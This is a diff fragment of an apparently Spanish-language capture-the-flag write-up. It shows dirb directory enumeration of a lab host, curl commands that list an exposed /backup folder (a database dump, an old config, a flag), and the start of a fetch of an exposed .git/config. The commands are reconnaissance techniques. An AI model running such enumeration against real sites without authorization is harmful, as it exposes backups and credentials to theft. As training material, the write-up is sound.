@@ -69,3 +69,32 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 GENERATED WORDS: 4612                                                          
 
+---- Scanning URL: http://phantomcorp/ ----
++ http://phantomcorp/admin (CODE:403|SIZE:65)                                                                                                        
++ http://phantomcorp/backup (CODE:200|SIZE:249)                                                                                                      
+                                                                                                                                                     
+-----------------
+END_TIME: Fri Sep 11 23:28:15 2026
+DOWNLOADED: 4612 - FOUND: 2
+```
+
+
+**Acceso al directorio descubierto:**  
+```text
+root@attacker:/loot# curl -s http://phantomcorp/backup/
+<!doctype html><html><body><h1>Index of /backup</h1>
+<pre>
+respaldo-db-2024.sql.gz
+config.old
+notas-infra.txt   ->  FLAG{dir_enumeration_backup}
+</pre>
+<p>Este directorio no deberia estar accesible. Enumeracion de directorios 101.</p>
+```
+
+
+### 2.2 - Evidencia: repositorio `.git` expuesto
+```console
+root@attacker:/loot# curl -s http://phantomcorp/.git/config
+[core]
+        repositoryformatversion = 0
+        bare = false
